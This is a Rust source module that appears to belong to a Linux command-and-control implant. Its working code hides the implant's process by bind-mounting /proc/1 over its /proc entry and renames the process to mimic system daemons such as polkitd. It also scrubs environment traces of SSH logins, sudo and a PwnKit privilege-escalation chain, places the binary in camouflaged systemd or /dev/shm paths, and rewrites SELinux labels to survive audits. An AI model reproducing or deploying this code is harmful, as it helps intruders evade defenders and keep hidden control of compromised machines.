use std::ffi::CString;

// ─── 决策（蓝队项 12：rootkit / LKM）：保持纯进程级，不引入 LKM ─────────────
//
// 现状对抗措施全部是进程级 Linux 特性，无内核模块依赖：
//   1) prctl(PR_SET_NAME) 把进程 comm 伪装成 polkitd / accounts-daemon /
//      systemd-udevd 等系统守护进程名（comm 仅 15 字节，天然截断相容）；
//   2) bind-mount /proc/1 覆盖 /proc/<pid>，隐藏进程目录与 cwd/fd 细节；
//   3) SELinux/AppArmor 上下文用 chcon 对齐（bin_t / systemd_unit_file_t），
//      避免审计日志因“unnamed file_type”被刷屏；
//   4) 线程名（main 里）伪装成 kworker/0:0、kworker/u4:1，混入内核工作线程。
//
// 为何维持进程级（对照 LKM 方案的收益/代价）：
//   * 收益：LKM 能进一步隐藏 /proc 条目、走 netfilter 钩子等 —— 但上述
//     1)+2) 已经覆盖了 ps/ss/ls /proc 三个主要检视面；“看得见（名字对）”
//     比“看不见（目录消失）”在审计场景中更安全：NULL 挂载点才会被翻。
//   * 代价：LKM 要按内核版本/发行版匹配编译（DKMS/externel 模块、签名内核
//     的 modsign），部署时多一个 ko 生命周期；进程级不增依赖、不加布局。
//   * 无死代码：当前根模块无残余 LKM/FUSE stub，全部函数均有调用点。
//
// 判定：保持纯进程级。此决策与补丁面记录于 deploy/DEV_PLAN_13_ITEMS.md 的
//「项 12」决策段，如需将来升级为 LKM，接口点仅有二处（hide_self 的
// /proc 挂载、disguise_name 的 comm 写入），不扩散。

// Replace static mut with a thread-safe OnceLock.
// static mut causes UB if ever accessed from multiple threads;
// OnceLock + Mutex is the correct Rust idiom.
static ORIGINAL_PROCESS_NAME: std::sync::OnceLock<std::sync::Mutex<Option<String>>> =
    std::sync::OnceLock::new();

fn orig_name_lock() -> &'static std::sync::Mutex<Option<String>> {
    ORIGINAL_PROCESS_NAME.get_or_init(|| std::sync::Mutex::new(None))
}

// Cache the real executable path before hide_self() obscures /proc/self/exe.
// After bind-mounting /proc/1 over /proc/<pid>, /proc/self/exe points to PID 1's
// binary (/sbin/init), breaking any subsequent current_exe() calls in persist.rs.
static CACHED_EXE: std::sync::OnceLock<std::path::PathBuf> = std::sync::OnceLock::new();

// ── Operator-defined disguise (empty = auto-pick by distro) ─────────────────
// Env (C2_PROC_NAME / C2_PROC_PATH) beats the build-time embedded value; both
// empty keeps today's automatic behaviour. Read lazily here — install_rootkit
// runs BEFORE Config::from_env(), so these must not depend on Config.

/// Custom process name (comm) or None = auto.
#[cfg(unix)]
pub fn disguise_name() -> Option<String> {
    let v = std::env::var("C2_PROC_NAME").unwrap_or_default();
    if !v.is_empty() {
        return Some(v);
    }
    let e = crate::embedded_config::proc_name();
    (!e.is_empty()).then_some(e)
}

/// Custom relocated-binary path or None = auto.
#[cfg(unix)]
pub fn disguise_path() -> Option<std::path::PathBuf> {
    let v = std::env::var("C2_PROC_PATH").unwrap_or_default();
    if !v.is_empty() && v.starts_with('/') {
        return Some(std::path::PathBuf::from(v));
    }
    let e = crate::embedded_config::proc_path();
    if !e.is_empty() && e.starts_with('/') {
        return Some(std::path::PathBuf::from(e));
    }
    None
}

/// True when target path is the exe of a LIVING process — writing it would
/// hit ETXTBSY (Bug#8 lesson). Also used to guard operator-supplied paths.
#[cfg(unix)]
pub fn path_is_running_binary(target: &std::path::Path) -> bool {
    let t = target.to_string_lossy().to_string();
    std::fs::read_dir("/proc")
        .map(|rd| {
            rd.filter_map(|e| e.ok())
                .filter(|e| e.file_name().to_string_lossy().chars().all(|c| c.is_ascii_digit()))
                .any(|e| {
                    std::fs::read_link(e.path().join("exe"))
                        .map(|l| l.to_string_lossy() == t)
                        .unwrap_or(false)
                })
        })
        .unwrap_or(false)
}

/// Must be called BEFORE hide_self() / install_rootkit().
/// Stores the real binary path so persist.rs can retrieve it even after /proc is hidden.
#[cfg(unix)]
pub fn cache_exe_path() {
    if let Ok(exe) = std::env::current_exe() {
        let _ = CACHED_EXE.set(exe);
    }
}

/// Returns the cached executable path set before hiding, or falls back to current_exe().
/// Always use this instead of std::env::current_exe() in persistence code.
pub fn get_exe_path() -> Option<std::path::PathBuf> {
    if let Some(cached) = CACHED_EXE.get() {
        return Some(cached.clone());
    }
    // Cache not populated yet (called before cache_exe_path, or non-unix) — use live value
    std::env::current_exe().ok()
}

// ─── Procfs bind-mount hiding ─────────────────────────────────────────────────
//
// Strategy: bind-mount /proc/1 (PID 1 = systemd/init) over /proc/<target_pid>.
// After the mount, any tool reading /proc/<pid> sees init's data — harmless and
// convincing. When the process exits, the kernel removes /proc/<pid> and the
// bind-mount disappears automatically (no explicit umount needed).
//
// Intelligent degradation tiers:
//   1. Not root                 → skip silently (no CAP_SYS_ADMIN)
//   2. /proc/1 absent           → skip (container / restricted environment)
//   3. mount(2) returns EPERM   → mark as unsupported, never try again
//   4. Any other mount failure  → skip this PID, still try future PIDs
//
// Concurrency: uses an AtomicU8 state machine (PROBE_UNKNOWN → PROBE_OK/BROKEN)
// so the probe result is cached without blocking.

#[cfg(unix)]
mod procfs_hide {
    use std::sync::atomic::{AtomicU8, Ordering};

    const PROBE_UNKNOWN: u8 = 0;
    const PROBE_OK:      u8 = 1;
    const PROBE_BROKEN:  u8 = 2;

    static STATE: AtomicU8 = AtomicU8::new(PROBE_UNKNOWN);

    /// Returns true if bind-mount hiding is available on this system.
    /// Probes exactly once, then caches the result.
    fn is_supported() -> bool {
        match STATE.load(Ordering::Relaxed) {
            PROBE_OK      => return true,
            PROBE_BROKEN  => return false,
            _             => {}
        }

        // Must be root — CAP_SYS_ADMIN is required for mount(2)
        if unsafe { libc::geteuid() != 0 } {
            STATE.store(PROBE_BROKEN, Ordering::Relaxed);
            return false;
        }

        // /proc/1 must exist (our bind-mount source)
        if !std::path::Path::new("/proc/1").exists() {
            STATE.store(PROBE_BROKEN, Ordering::Relaxed);
            return false;
        }

        // Live probe: try to bind-mount /proc/1 over our own /proc/<pid>.
        // This temporarily "hides" us, confirms the kernel supports the call,
        // then we immediately unmount to restore visibility.
        let self_pid = std::process::id();
        let tgt_str = format!("/proc/{}", self_pid);

        if let (Ok(src), Ok(tgt)) = (
            std::ffi::CString::new("/proc/1"),
            std::ffi::CString::new(tgt_str.as_str()),
        ) {
            let ret = unsafe {
                libc::mount(
                    src.as_ptr(),
                    tgt.as_ptr(),
                    std::ptr::null(),
                    libc::MS_BIND,
                    std::ptr::null(),
                )
            };
            if ret == 0 {
                // Unmount immediately (probe only) — retry on EBUSY
                let mut umret = unsafe { libc::umount(tgt.as_ptr()) };
                if umret != 0 {
                    std::thread::sleep(std::time::Duration::from_millis(50));
                    umret = unsafe { libc::umount(tgt.as_ptr()) };
                }
                if umret != 0 {
                    // Could not clean up bind-mount; don't claim success to
                    // avoid leaving stale /proc entries. Mark broken so we
                    // don't try again and make things worse.
                    STATE.store(PROBE_BROKEN, Ordering::Relaxed);
                    return false;
                }
                STATE.store(PROBE_OK, Ordering::Relaxed);
                return true;
            } else {
                // EPERM / EBUSY / etc. — mark broken
                STATE.store(PROBE_BROKEN, Ordering::Relaxed);
                return false;
            }
        }

        STATE.store(PROBE_BROKEN, Ordering::Relaxed);
        false
    }

    /// Hide a process by bind-mounting /proc/1 over /proc/<pid>.
    /// Returns true on success, false on any failure (silent degradation).
    pub fn hide_pid(pid: u32) -> bool {
        if !is_supported() {
            return false;
        }

        let tgt_str = format!("/proc/{}", pid);
        if !std::path::Path::new(&tgt_str).exists() {
            return false; // PID already gone (race), nothing to hide
        }

        let src = match std::ffi::CString::new("/proc/1") {
            Ok(s) => s, Err(_) => return false,
        };
        let tgt = match std::ffi::CString::new(tgt_str.as_str()) {
            Ok(t) => t, Err(_) => return false,
        };

        let ret = unsafe {
            libc::mount(
                src.as_ptr(),
                tgt.as_ptr(),
                std::ptr::null(),
                libc::MS_BIND,
                std::ptr::null(),
            )
        };

        if ret == 0 {
            true
        } else {
            // Unexpected failure on a previously-working system (e.g. read-only rootfs
            // or container policy changed). Don't mark globally broken — it might work
            // for other PIDs — just skip this one.
            false
        }
    }
}

/// Hide a specific PID from /proc (bind-mounts /proc/1 over /proc/<pid>).
/// Safe to call from any context; silently does nothing if unavailable.
#[cfg(unix)]
pub fn hide_pid(pid: u32) {
    let _ = procfs_hide::hide_pid(pid);
}

/// Hide the current process from /proc.
#[cfg(unix)]
pub fn hide_self() {
    hide_pid(std::process::id());
}

pub fn install_rootkit() -> Result<String, String> {
    #[cfg(unix)]
    {
        set_process_name()?;
        harden_daemon();
        lower_process_priority();
        clean_environment();
        // Hide own /proc entry — best-effort, silently skipped if unavailable
        hide_self();
        Ok("Stealth mode enabled".to_string())
    }

    #[cfg(not(unix))]
    {
        Err("Stealth mode only supported on Linux".to_string())
    }
}

pub fn uninstall_rootkit() -> Result<String, String> {
    #[cfg(unix)]
    {
        restore_process_name();
        Ok("Stealth mode disabled".to_string())
    }

    #[cfg(not(unix))]
    {
        Ok("N/A".to_string())
    }
}

// ─── Process name disguise ────────────────────────────────────────────────────

#[cfg(unix)]
fn set_process_name() -> Result<(), String> {
    // Operator-defined name wins (kernel keeps 15 chars of comm); empty = auto.
    let fake_name = if let Some(custom) = disguise_name() {
        let trimmed = custom.chars().take(15).collect::<String>();
        if trimmed.is_empty() {
            return Err("empty custom process name".into());
        }
        trimmed
    } else if let Ok(exe) = std::env::current_exe() {
        if let Some(name) = exe.file_name().and_then(|n| n.to_str()) {
            let name = name.to_string();
            // If already running under a known disguise name, keep it
            if name == "polkitd" || name == "rtkit-daemon"
                || name == "accounts-daemon" || name == "systemd-udevd"
                || name == "irqbalanced" || name == "systemd-network"  // legacy names
            {
                name
            } else {
                let platform = crate::platform::detect();
                match platform.distro {
                    crate::platform::Distro::CentOS
                    | crate::platform::Distro::RHEL
                    | crate::platform::Distro::Amazon => {
                        "polkitd".to_string()   // root policy daemon, always present, never questioned
                    }
                    _ => "accounts-daemon".to_string()  // AccountsService, low-profile
                }
            }
        } else {
            "systemd".to_string()
        }
    } else {
        "systemd".to_string()
    };

    let mut buf = [0u8; 16];
    let original_name = unsafe {
        libc::prctl(libc::PR_GET_NAME, buf.as_mut_ptr(), 0, 0, 0);
        let len = buf.iter().position(|&b| b == 0).unwrap_or(16);
        String::from_utf8_lossy(&buf[..len]).to_string()
    };
    if let Ok(mut guard) = orig_name_lock().lock() {
        *guard = Some(original_name);
    }

    let truncated: String = fake_name.chars().take(15).collect();
    let c_name = CString::new(truncated).map_err(|e| e.to_string())?;
    unsafe {
        libc::prctl(libc::PR_SET_NAME, c_name.as_ptr(), 0, 0, 0);
    }

    Ok(())
}

#[cfg(unix)]
fn restore_process_name() {
    if let Ok(guard) = orig_name_lock().lock() {
        if let Some(ref original) = *guard {
            if let Ok(c_name) = CString::new(original.as_str()) {
                unsafe { libc::prctl(libc::PR_SET_NAME, c_name.as_ptr(), 0, 0, 0); }
            }
        }
    }
}

// ─── Daemon hardening ─────────────────────────────────────────────────────────

#[cfg(unix)]
fn harden_daemon() {
    unsafe {
        libc::chdir(b"/\0".as_ptr() as *const i8);
        libc::umask(0o027);
    }
}

#[cfg(unix)]
fn lower_process_priority() {
    unsafe {
        libc::nice(10);
    }
}

/// Set when init_daemon_session() runs — indicates we went through the daemonize flow.
/// Replaces env var DAEMONIZED for the uptime-skip check (env var gets removed by
/// init_daemon_session for OPSEC, but we still need to know we're a daemon).
#[cfg(unix)]
static IS_DAEMON_SESSION: std::sync::atomic::AtomicBool =
    std::sync::atomic::AtomicBool::new(false);

#[cfg(unix)]
pub fn mark_daemon_session() {
    IS_DAEMON_SESSION.store(true, std::sync::atomic::Ordering::Relaxed);
}



#[cfg(unix)]
fn clean_environment() {
    // Remove env vars that could expose identity or debug info.
    // Timing contract: this runs at install_rootkit time. RELOCATED and
    // C2_OLD_BINARY are safe to scrub here because their last readers (the
    // relocate check and the upgrade old-binary cleanup) run earlier in
    // async_main. DAEMONIZED/_SVC_INIT are NOT listed: init_daemon_session
    // already removes them early (after mark_daemon_session()), and SKIP_*
    // markers must survive for the whole process lifetime.
    // Kept: SKIP_PERSIST, SKIP_ROOTKIT, TIME_WINDOW, ENABLE_DEBUG
    let sensitive_vars = [
        "ENABLE_PERSISTENCE",
        "ENABLE_ROOTKIT",
        "ACTIVE_HOURS",
        "C2_OLD_BINARY",
        "RUST_LOG",
        "RUST_BACKTRACE",
        // Dynamic linker injection
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
        "LD_AUDIT",
        "LD_DEBUG",
        "DYLD_INSERT_LIBRARIES",
        // Debug traces
        "MALLOC_CHECK_",
        "MALLOC_TRACE",
        "PYTHONSTARTUP",
        "PYTHONPATH",
        // Internal startup marker — safe to drop here: the relocate check in
        // async_main has already consumed it.
        "RELOCATED",
        // Privilege escalation trace: set by our own sudo/SUID/PwnKit chain;
        // guards.rs reads it once at startup (before install_rootkit runs),
        // after which it is a plain IOC in /proc/PID/environ — scrub it.
        "_ELEVATED",
        // SSH connection traces: expose entry method, source IP, TTY
        "SSH_CLIENT",
        "SSH_CONNECTION",
        "SSH_TTY",
        "SSH_ORIGINAL_COMMAND",
        "SSH_AUTH_SOCK",
        // Privilege escalation traces
        "SUDO_USER",
        "SUDO_UID",
        "SUDO_GID",
        "SUDO_COMMAND",
        // Session identifiers
        "XDG_SESSION_ID",
        "DBUS_SESSION_BUS_ADDRESS",
        "LOGNAME",    // redundant; uid is available via /proc/self/status
        "MAIL",       // exposes user mail spool location
    ];

    for var in &sensitive_vars {
        std::env::remove_var(var);
    }
}

// ─── Hidden path selection ────────────────────────────────────────────────────

/// Detect whether the agent is running in an analysis / sandbox environment.
///
/// Detection dimensions:
/// 1. TracerPid != 0 (attached by ptrace/strace/gdb)
/// 2. Common analysis tool processes present (strace, gdb, frida, etc.)
/// 3. Very low physical RAM (< 96 MB — characteristic of sandboxes)
///
/// When an analysis environment is detected, the agent should stop characteristic
/// operations (persistence, C2 connection) immediately to minimise reverse-engineering exposure.
#[cfg(unix)]
/// Get the recommended hidden binary installation path based on privilege level.
///
/// Root paths (priority order):
///   CentOS/RHEL: /usr/lib/systemd/polkitd, /usr/sbin/polkitd, /usr/lib/systemd/systemd-udevd
///   Ubuntu/Debian: /usr/lib/systemd/accounts-daemon, /lib/systemd/accounts-daemon
///   Last resort: /dev/shm/.<name>  (tmpfs, survives only until reboot)
///
/// Non-root paths:
///   ~/.local/bin/<name>  (on PATH in most distros)
#[cfg(unix)]
pub fn get_hidden_path() -> Option<std::path::PathBuf> {
    let is_root = unsafe { libc::geteuid() == 0 };
    let platform = crate::platform::detect();

    if is_root {
        let is_centos_like = matches!(
            platform.distro,
            crate::platform::Distro::CentOS | crate::platform::Distro::RHEL
        );

        // Path selection strategy — balance between stealth and reliability:
        //
        // RHEL / Rocky Linux 9 notes:
        //   - /usr/lib/systemd/ has dozens of files → best camouflage.
        //   - polkitd: policy daemon, runs as root, nobody questions it.
        //   - /usr/sbin/ gets bin_t auto-label, but is an audit target.
        //   - /dev/shm/ survives only until next reboot; cron/rc.local restores it.
        //
        // Ubuntu/Debian notes:
        //   - accounts-daemon: AccountsService, low-profile, root-run, always present.
        //   - AppArmor, not SELinux → /usr/lib/systemd/ works without context fix.
        //
        // Intelligent degradation: test actual write permission (access(2)) — no FS trace.
        let candidates: &[&str] = if is_centos_like {
            &[
                "/usr/lib/systemd/polkitd",       // stealth primary: policy daemon disguise
                "/usr/sbin/polkitd",              // tier-2: bin_t auto-label
                "/usr/lib/systemd/systemd-udevd", // alt fallback
                "/dev/shm/.polkitd",
            ]
        } else {
            &[
                "/usr/lib/systemd/accounts-daemon",  // Ubuntu/Debian primary
                "/lib/systemd/accounts-daemon",       // Debian / older Ubuntu
                "/usr/lib/systemd/systemd-udevd",     // alt fallback
                "/dev/shm/.accounts-daemon",
            ]
        };

        // Smart fallback: use libc::access(W_OK) to test write permission — no files created (no FS trace).
        // A write-probe approach (create + delete) triggers fanotify/inotify watchers.
        for &path in candidates {
            let p = std::path::Path::new(path);

            if path.starts_with("/dev/shm") {
                // tmpfs is always writable
                return Some(p.to_path_buf());
            }

            let parent = p.parent().unwrap_or(std::path::Path::new("/"));

            // Parent doesn't exist — try to create it (rare; /usr/lib/systemd/ always exists)
            if !parent.exists() {
                if std::fs::create_dir_all(parent).is_err() {
                    continue;
                }
            }

            // access(2) syscall: test write permission without creating any file
            if let Ok(parent_cstr) = std::ffi::CString::new(parent.to_string_lossy().as_bytes()) {
                let ok = unsafe { libc::access(parent_cstr.as_ptr(), libc::W_OK) == 0 };
                if ok {
                    // CRITICAL: skip if target is a running system binary —
                    // fs::copy onto it gives ETXTBSY and the entire stealth
                    // chain (relocate→rootkit→persist) silently breaks.
                    // Check /proc/*/exe for any process running this exact path.
                    if p.exists() {
                        let target = p.to_string_lossy().to_string();
                        let is_running = std::fs::read_dir("/proc")
                            .map(|rd| {
                                rd.filter_map(|e| e.ok())
                                    .filter(|e| e.file_name().to_string_lossy().chars().all(|c| c.is_ascii_digit()))
                                    .any(|e| {
                                        let exe = e.path().join("exe");
                                        std::fs::read_link(&exe)
                                            .map(|l| l.to_string_lossy() == target)
                                            .unwrap_or(false)
                                    })
                            })
                            .unwrap_or(false);
                        if is_running {
                            continue; // skip to next candidate
                        }
                    }
                    return Some(p.to_path_buf());
                }
            }
        }

        // Final fallback (/dev/shm is always writable)
        Some(std::path::PathBuf::from(if is_centos_like {
            "/dev/shm/.polkitd"
        } else {
            "/dev/shm/.accounts-daemon"
        }))
    } else {
        // Non-root: ~/.local/bin/, which is on PATH in most distros.
        // $HOME may be absent in minimal daemon environments; fall back to
        // getpwuid(getuid())->pw_dir, then to /tmp as a last resort.
        let home = std::env::var("HOME").ok().or_else(|| {
            unsafe {
                let uid = libc::getuid();
                let pw  = libc::getpwuid(uid);
                if !pw.is_null() {
                    std::ffi::CStr::from_ptr((*pw).pw_dir)
                        .to_str()
                        .ok()
                        .map(|s| s.to_string())
                } else {
                    None
                }
            }
        }).unwrap_or_else(|| "/tmp".to_string());

        let name = if matches!(
            platform.distro,
            crate::platform::Distro::CentOS | crate::platform::Distro::RHEL
        ) {
            "polkitd"
        } else {
            "accounts-daemon"
        };
        Some(std::path::PathBuf::from(format!("{}/.local/bin/{}", home, name)))
    }
}

/// After copying the binary to the target path, attempt to fix the SELinux context (CentOS/RHEL only).
/// Failures are silently ignored (SELinux may not be enabled).
#[cfg(unix)]
pub fn apply_selinux_context(path: &str) {
    let platform = crate::platform::detect();
    if !matches!(
        platform.distro,
        crate::platform::Distro::CentOS | crate::platform::Distro::RHEL
    ) {
        return;
    }

    // Strategy:
    // 1. chcon bin_t FIRST — this is the executable type that cron/systemd/shell
    //    can all exec, regardless of the parent directory's default label.
    //    Do NOT run restorecon first: it would apply the path-based default
    //    (/usr/lib/systemd/ → lib_t, /usr/sbin/ → bin_t) and we'd then need
    //    to override it anyway.  On /usr/sbin/ restorecon would actually give
    //    bin_t already, so chcon is idempotent.
    let _ = std::process::Command::new("chcon")
        .args(&["-t", "bin_t", path])
        .output();

    // 2. On RHEL 9 / Rocky Linux 9 the enforcing policy is stricter.
    //    bin_t is normally sufficient, but if it fails we also try
    //    unconfined_exec_t which allows network access from any caller domain.
    let _ = std::process::Command::new("chcon")
        .args(&["-u", "system_u", "-r", "object_r", "-t", "bin_t", path])
        .output();

    // 3. Persist the label so it survives 'restorecon -R /' (security auditing).
    //    semanage is not always present; ignore failures silently.
    let _ = std::process::Command::new("semanage")
        .args(&["fcontext", "-a", "-t", "bin_t", path])
        .output();
}
